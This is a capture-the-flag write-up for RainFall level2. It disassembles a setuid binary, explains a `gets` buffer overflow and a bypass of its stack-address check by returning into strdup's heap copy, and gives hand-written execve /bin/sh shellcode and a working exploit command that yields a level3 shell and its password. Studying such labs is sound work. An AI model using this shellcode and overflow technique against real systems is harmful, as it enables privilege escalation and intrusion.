# level2

## Initial analysis

According to `file` :

```bash
level2@RainFall:~$ file level2
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```

So we know we want to spawn a shell while having the privilege of `level3`.

Let's analyse further with `objdump` :

```text
level2@RainFall:~$ objdump -Mintel -d level2

level2:     file format elf32-i386

...

080484d4 <p>:
 80484d4:       55                      push   ebp
 80484d5:       89 e5                   mov    ebp,esp
 80484d7:       83 ec 68                sub    esp,0x68
 80484da:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484df:       89 04 24                mov    DWORD PTR [esp],eax
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
 80484ea:       89 04 24                mov    DWORD PTR [esp],eax
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]
 80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 80484f8:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000
 8048505:       75 20                   jne    8048527 <p+0x53>
 8048507:       b8 20 86 04 08          mov    eax,0x8048620
 804850c:       8b 55 f4                mov    edx,DWORD PTR [ebp-0xc]
 804850f:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048513:       89 04 24                mov    DWORD PTR [esp],eax
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
 804851b:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
 8048527:       8d 45 b4                lea    eax,[ebp-0x4c]
 804852a:       89 04 24                mov    DWORD PTR [esp],eax
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048532:       8d 45 b4                lea    eax,[ebp-0x4c]
 8048535:       89 04 24                mov    DWORD PTR [esp],eax
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
 804853d:       c9                      leave  
 804853e:       c3                      ret    

0804853f <main>:
 804853f:       55                      push   ebp
 8048540:       89 e5                   mov    ebp,esp
 8048542:       83 e4 f0                and    esp,0xfffffff0
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave  
 804854b:       c3                      ret    
 804854c:       90                      nop
 804854d:       90                      nop
 804854e:       90                      nop
 804854f:       90                      nop
```

Unlike level2, this setup does not include any existing code in the .text section to spawn a shell. In our exploit, we must somehow inject additional code to achieve this. This is known as **shellcode** — a small piece of code used as the payload when exploiting a software vulnerability.

In function `p`, the highly unsafe `gets` function is called once again. This is a serious vulnerability because it allows a **buffer overflow**, enabling us to overwrite the return address of function `p` on the stack. But where should we redirect execution?

Since we need to introduce additional code, we can inject it into the buffer used by `gets` and then modify the return address to point to our shellcode, which resides in the stack.

However, this approach have an issue in this particular setup. Consider the following snippet of instructions:

```
 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]
 80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 80484f8:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000
 8048505:       75 20                   jne    8048527 <p+0x53>
```

The program performs a check on the return address located at `ebp + 0x4`. Specifically, it verifies whether the most significant byte of the return address is `0xb`. If it is, this indicates that we have manipulated the return address to point to the stack, which would prevent us from successfully redirecting execution to our shellcode.

If the check fails, execution is redirected to `0x8048527`. This presents a challenge, as it blocks a straightforward return-to-shellcode approach. But we might have a solution :

```
 8048527:       8d 45 b4                lea    eax,[ebp-0x4c]
 804852a:       89 04 24                mov    DWORD PTR [esp],eax
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048532:       8d 45 b4                lea    eax,[ebp-0x4c]
 8048535:       89 04 24                mov    DWORD PTR [esp],eax
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
 804853d:       c9                      leave  
 804853e:       c3                      ret    
```

The program first echoes back what we wrote into the buffer and then proceeds to duplicate the stack-allocated buffer into a heap-allocated region. This is an interesting behavior!

Instead of modifying the return address to point to our buffer in the stack — where execution is blocked by the "security check". We can redirect it to the heap-allocated region instead. Since the data is duplicated exactly, our shellcode will still be present in memory and ready for execution.

The main challenge here is that our shellcode must not contain any **NUL bytes** (0x00), as `strdup` treats NUL as the end of the string. If our shellcode includes a NUL byte, it will be truncated prematurely, making it ineffective.

## Crafting the shellcode

Let's do some assembly to craft our shellcode, shall we ?

```asm
bits 32

section .text

global _start

_start:
    jmp .shell_define
.ret:
    pop ebx
    xor eax, eax
    mov ecx, eax
    mov edx, eax
    mov al, 0x0b
    int 0x80
.shell_define:
    call .ret
    shell db "/bin/sh", 0
```

This is a basic program that `execve` a shell. Note the trick to get the address of the string `/bin/sh` : at the beginning we immediately jump to a `call .ret`, which pushes the address of `/bin/sh` into the stack and jump to `pop ebx`, which pop the address of `/bin/sh` into the register `ebx`. This trick is used to dynamically get the address, since somtimes we do not know the exact address our shellcode will be injected.
Do note that we use the **relative** version of `jmp` and `call`, so we can indicate **offsets** instead of **absolute address**.

We are using x86 calling conventions and `int 0x80` to trap into kernel mode for the syscall.
Now, let's compile the source into an object file, and dump the `.text` section :

```bash
$> nasm -f elf32 shellcode.s
$> readelf --sections shellcode.o
There are 15 section headers, starting at offset 0x40:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [ 1] .text             PROGBITS        00000000 0002a0 00001a 00  AX  0   0 16
  ...

```

Offset is `0x2a0` into the file and the size of our shellcode is `0x1a`. We can use `xxd` to extract the bytes and `sed` with some regex to format into an hex litteral :

```bash
$> xxd -l0x1a -s0x2a0 -ps shellcode.o | sed -E 's/([a-f0-9]{2})/\\x\U\1/g'
\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00
```

This shellcode doesn't lead to any `0x00` expect for the last byte. `strdup` will stop there. Perfect !

## Putting it together

These are the remaining steps :

  - Find how big the buffer is to know how many bytes we have to fill until overwriting the return address.
  - Set the return address to the return address of `strdup`.
  - Craft a python command to inject our **shellcode**, filling characters, and the new **return address**.

Using **GDB** and the disassembly, we find out that the buffer starting address is located at `ebp - 0x4c` :

```
 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
 80484ea:       89 04 24                mov    DWORD PTR [esp],eax
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
```

 We need to fill 76 bytes (`0x4c` is 76 in decimal) + 4 bytes (because `ebp` has been pushed to the stack, we need to add an extra 4 bytes), to get to the return address location in the stack (that is, `ebp + 4`).

Let's find the return address of `strdup` by setting a breakpoint just after the call :

```
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     sub    esp, 0x68
   ...
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d
(gdb) r
Starting program: /home/user/level2/level2 
foo
foo

Breakpoint 1, 0x0804853d in p ()
(gdb) i r eax
eax            0x804a008        134520840
```

Our shellcode is 26 bytes long. This is the layout of the bytes we will inject :

```
[shellcode][filling][return_address]
    26        54           4
```

This leads to the following python command :

```
python -c 'print("\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00" + "a"*54 + "\x08\xa0\x04\x08")'
```

We can then proceed to pwn this program. Notice the use `cat` again to prevent premature closing of the *standard input*.

```bash
level2@RainFall:~$ (python -c 'print("\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00" + "a"*54 + "\x08\xa0\x04\x08")'; cat) | ./level2 
�
 [1����°
        �����/bin/sh
whoami
level3
cd ../level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Success !